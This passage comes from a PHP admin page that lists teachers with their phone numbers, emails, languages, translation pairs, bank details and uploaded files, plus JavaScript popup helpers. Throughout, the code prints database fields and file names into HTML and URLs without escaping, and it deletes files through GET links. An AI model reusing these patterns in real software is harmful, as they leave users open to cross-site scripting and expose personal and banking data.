        print "&nbsp;".($curdocenti['user_attivo']==1 ? "<IMG SRC='../img/ledgreen.png' BORDER=0 ALIGN=MIDDLE ALT='"._MSGUSERATTIVO_."' TITLE='"._MSGUSERATTIVO_."'>":"<IMG SRC='../img/ledred.png' BORDER=0 ALIGN=MIDDLE ALT='"._MSGUSERNONATTIVO_."' TITLE='"._MSGUSERNONATTIVO_."'>");
        print "&nbsp;";
        if ($curdocenti['user_fboss']==1) {
          //admin
          print "<IMG SRC='../img/admin.png' BORDER=0 ALIGN=MIDDLE>";
        } else {
          if ($curdocenti['user_fviceboss']==1) {
            //vice
            print "<IMG SRC='../img/viceadmin.png' BORDER=0 ALIGN=MIDDLE>";
          } else {
            //niente
            print "<IMG SRC='../img/admindisabled.png' BORDER=0 ALIGN=MIDDLE>";
          }
        }
      }
      
      print "</TD>";
      */
      
      print "<TD CLASS=lista_col_form2>";
        print "<IMG SRC='../img/tel16.png'> ".$curdocenti['docente_tel']."<BR>";
        print "<IMG SRC='../img/mobile16.png'> ".$curdocenti['docente_mobile'];
        
        unset($vetmails);
        $vetmails = explode(";", $curdocenti['docente_email']);
        foreach ($vetmails as $curmail) {
          $curmail = str_replace(" ", "", $curmail);
          print "<BR><A HREF='mailto:".$curmail."'><IMG SRC='../img/email16.png' BORDER='0'> ".$curmail."</A>";
        }
        
      print "</TD>";
      
      //lingue
      print "<TD CLASS=lista_col_form2>";
        foreach ($curdocenti['insegna'] as $curlingua) {
          print "<IMG SRC='../flag/".$curlingua['img1']."' ALT='".$curlingua['descr']."' TITLE='".$curlingua['descr']."'>, ";
        }
      print "</TD>";
      
      //traduzioni
      print "<TD CLASS=lista_col_form2>";
        foreach ($curdocenti['traduce'] as $curlingua) {
          print "<IMG SRC='../flag/".$curlingua['da_img1']."' ALT='".$curlingua['da_descr']."' TITLE='".$curlingua['da_descr']."'> <IMG SRC='../img/next.png'> <IMG SRC='../flag/".$curlingua['a_img1']."' ALT='".$curlingua['a_descr']."' TITLE='".$curlingua['a_descr']."'><BR>";
        }
      print "</TD>";
      
      //interprete
      print "<TD CLASS=lista_col_form2>";
        foreach ($curdocenti['interpreta'] as $curlingua) {
          print "<IMG SRC='../flag/".$curlingua['da_img1']."' ALT='".$curlingua['da_descr']."' TITLE='".$curlingua['da_descr']."'> <IMG SRC='../img/next.png'> <IMG SRC='../flag/".$curlingua['a_img1']."' ALT='".$curlingua['a_descr']."' TITLE='".$curlingua['a_descr']."'><BR>";
        }
      print "</TD>";
      
      //print "<TD CLASS=lista_col_form2 ALIGN=CENTER>".($line['docente_attivo']==1 ? "<A HREF='".FILE_DBQUERY."?cmd=". FASEDENY ."&codicepagina=". codiceform(FILE_CORRENTE) ."&selobj=". $line['docente_id']."'><IMG SRC='../img/ledgreen.png' BORDER=0 ALIGN=MIDDLE ALT='"._TXTDISABILITA_."' TITLE='"._TXTDISABILITA_."'></A>" : "<A HREF='".FILE_DBQUERY."?cmd=". FASEALLOW ."&codicepagina=". codiceform(FILE_CORRENTE) ."&selobj=". $line['docente_id']."'><IMG SRC='../img/ledred.png' BORDER=0 ALIGN=MIDDLE ALT='"._TXTABILITA_."' TITLE='"._TXTABILITA_."'></A>")."</TD>";
      
      switch ($curdocenti['docente_attivo']) {
        case CORRENTE:
          $imgledstato="ledgreen.png";
          $txtstato = _CORRENTE_;
          break;
        case POTENZIALE:
          $imgledstato="ledyellow.png";
          $txtstato = _POTENZIALE_;
          break;
        case VECCHIO:
          $imgledstato="ledred.png";
          $txtstato = _VECCHIO_;
          break;
        default:
          $imgledstato="ledgray.png";
          $txtstato = _NONDEF_;
      }
      print "<TD CLASS=lista_col_form2 ALIGN='CENTER'>"."<IMG SRC='../img/".$imgledstato."' ALT='$txtstato' TITLE='$txtstato' CLASS='manina' onClick=chiamapopup_stato(".$keydocenti.")>"."</TD>";
       
      //COMANDI
      print "<TD CLASS=lista_col_form2><TABLE width=100%>
      <TR>
        <TD ALIGN=CENTER><IMG CLASS='manina' SRC='../img/mod.png' border=0 ALT='"._LBLMATITA_."' TITLE='"._LBLMATITA_."' onClick=chiamapopup(". FASEMOD .",". $keydocenti .")></A></TD>
        <TD ALIGN=CENTER><A HREF='#' onClick=urldelete(\"". FILE_DBQUERY ."?cmd=". FASEDEL ."&codicepagina=". codiceform(FILE_CORRENTE) ."&selobj=". $keydocenti ."\")><IMG SRC='../img/canc.png' border=0 ALT='"._LBLCANCELLA_."' TITLE='"._LBLCANCELLA_."'></A></TD>
        <TD ALIGN=CENTER><A HREF='#blocco".$keydocenti."' onClick=mostradett(\"dettrow_".$keydocenti."\")><IMG SRC='../img/lente.png' CLASS=manina border=0 ALT='"._LBLLENTE_."' TITLE='"._LBLLENTE_."'></A></TD>
      </TR>
      <TR>
        <TD ALIGN=CENTER><IMG SRC='../img/upload.png' CLASS=manina border=0 ALT='"._LBLUPLOADFILE_."' TITLE='"._LBLUPLOADFILE_."' onClick=chiamafilepopup(". $keydocenti .")></TD>
        <TD ALIGN=CENTER><IMG SRC='../img/lingua2.png' CLASS=manina border=0 ALT='"._LBLLINGUE_."' TITLE='"._LBLUPLOADFILE_."' onClick=chiamalinguapopup(". $keydocenti .")></TD>
        <TD></TD>
      </TR>";
			print "</TABLE></TD>";
      print "</TR>";
      
      //DETTAGLIO
      print "<TR>
           <TD COLSPAN=7 STYLE='width:100%;'>";
      print "<TABLE id='dettrow_".$keydocenti."' STYLE='width:100%;display: ".($cmd['openblock']==$keydocenti ? " block ":" none ").";'>
              <TR><TD STYLE='width:100%;'>";
        print "<DIV STYLE='border:2px solid #0000FF;width:100%;background-color:#FFFACD;'>";
        print "<TABLE WIDTH=100%>";
          print "<TR><TD CLASS=cust_lbl>"._LBLBANCA_."</TD><TD CLASS=cust_lbl>"._LBLCONTO_."</TD><TD CLASS=cust_lbl>"._LBLRUT_."</TD></TR>";
          //print "<TR><TD>".$curdocenti['docente_banca']."</TD><TD>".$curdocenti['docente_conto']."</TD><TD>".$curdocenti['docente_rut']."</TD></TR>";
          print "<TR><TD>".$curdocenti['banca_nomebanca']."</TD><TD>".$curdocenti['ccbanca_codice']."</TD><TD>".$curdocenti['docente_rut']."</TD></TR>";
          
          print "<TR><TD CLASS=cust_lbl>"._LBLTIPOCONTO_."</TD><TD CLASS=cust_lbl>"._LBLCONTATTO_."</TD></TR>";
          print "<TR><TD>".$curdocenti['ccbanca_label']."</TD><TD COLSPAN=2>".$curdocenti['docente_contatto']."</TD></TR>";
          print "<TR><TD COLSPAN=3 CLASS=cust_lbl>"._LBLNOTE_."</TD></TR>";
          print "<TR><TD COLSPAN=3>".conv_textarea($curdocenti['docente_note'])."</TD></TR>";
        print "</TABLE>";
        print "</DIV>";
        
        //FILES
        if (count($curdocenti['files'])>0) {
          print "<BR><DIV STYLE='border:2px solid #0000FF;width:100%;background-color:#FFFACD;'>";
          print "<TABLE WIDTH=100%>";
          
          foreach ($curdocenti['files'] as $keydocfile =>$curdocfile) {
            $imgfile = tipomime($curdocfile['mime'],IMMAGINE);
            print "<TR>";
            print "<TD CLASS=lista_col_form2 ALIGN=CENTER>
               <A HREF='../upload/".$curdocfile['nomefile']."' TARGET=_blank><IMG SRC='../img/".$imgfile."' BORDER=0></A>
               <A HREF='#' onClick=urldelete(\"". FILE_DBQUERY ."?cmd=". FASEDELFILE ."&codicepagina=". codiceform(FILE_CORRENTE) ."&selobj=". $keydocfile ."&nomefile=".$curdocfile['nomefile']."&idd=$keydocenti\")><IMG SRC='../img/canc.png' border=0 ALT='"._LBLCANCELLA_."' TITLE='"._LBLCANCELLA_."'>
            </TD>";
            print "<TD CLASS=lista_col_form2>".date("d/m/Y H:i",$curdocfile['times'])."</TD>";
            print "<TD CLASS=lista_col_form2>".$curdocfile['txt']."</TD>";
            print "</TR>";
          }
          print "</TABLE></DIV>";          
        }
      print "</TD></TR>";
      print "</TABLE>";
      print "</TD></TR>"; 
    }
       
    echo "</TABLE><BR>";
  }

  include ("finepagina.php");
?>
<SCRIPT>
  function gocsv() {
    document.fstato.csv.value="1";
    document.fstato.submit();
  }
  
  function mostradett(chiave) {
    var elem = document.getElementById(chiave);  
    if (elem.style.display == "block") {
      elem.style.display = "none";
    } else {
      elem.style.display = "block";
    }
  }
  function chiamapopup_stato(id) {
    var figlio;
    var width  = 800;
    var height = 550;
    var left   = (screen.width  - width)/2;
    var top    = (screen.height - height)/2;
    var params = 'width='+width+', height='+height;
    params += ', top='+top+', left='+left;
    params += ', directories=no';
    params += ', location=no';
    params += ', menubar=no';
    params += ', resizable=no';
    params += ', scrollbars=yes';
    params += ', status=no';
    params += ', toolbar=no';
    
    figlio = window.open("frm_docenti_statopopup.php?selobj="+id,"docentestato",params);
    if (figlio.opener==null) {
      figlio.opener=self;
      figlio.frames["saveopener"].opener=self;
    }
  }
  function chiamafilepopup(id) {
    var figlio;
    var width  = 800;
    var height = 550;
    var left   = (screen.width  - width)/2;
    var top    = (screen.height - height)/2;
    var params = 'width='+width+', height='+height;
    params += ', top='+top+', left='+left;
    params += ', directories=no';
    params += ', location=no';
    params += ', menubar=no';
    params += ', resizable=no';
    params += ', scrollbars=yes';
    params += ', status=no';
    params += ', toolbar=no';
    
    figlio = window.open("frm_docenti_filepopup.php?selobj="+id,"docentestato",params);
    if (figlio.opener==null) {
      figlio.opener=self;
      figlio.frames["saveopener"].opener=self;
    }
  }
  
  function chiamalinguapopup(id) {
    var figlio;
    var width  = 800;
    var height = 550;
    var left   = (screen.width  - width)/2;
    var top    = (screen.height - height)/2;
    var params = 'width='+width+', height='+height;
    params += ', top='+top+', left='+left;
    params += ', directories=no';
    params += ', location=no';
    params += ', menubar=no';
    params += ', resizable=no';
    params += ', scrollbars=yes';
    params += ', status=no';
    params += ', toolbar=no';
    
    figlio = window.open("frm_docenti_lingua.php?selobj="+id,"docentelingua",params);
    if (figlio.opener==null) {
      figlio.opener=self;
      figlio.frames["saveopener"].opener=self;
    }
  }
  
  function chiamapopup(fase,id) {
    var figlio;
    var width  = 800;
    var height = 550;
    var left   = (screen.width  - width)/2;
    var top    = (screen.height - height)/2;
    var params = 'width='+width+', height='+height;
    params += ', top='+top+', left='+left;
    params += ', directories=no';
    params += ', location=no';
    params += ', menubar=no';
    params += ', resizable=no';
    params += ', scrollbars=yes';
    params += ', status=no';
    params += ', toolbar=no';
    
    figlio = window.open("frm_docenti_addpopup.php?selobj="+id+"&cmd="+fase,"docenti",params);
    if (figlio.opener==null) {
      figlio.opener=self;
      figlio.frames["saveopener"].opener=self;
    }
  }
</SCRIPT>
</body>
</html>
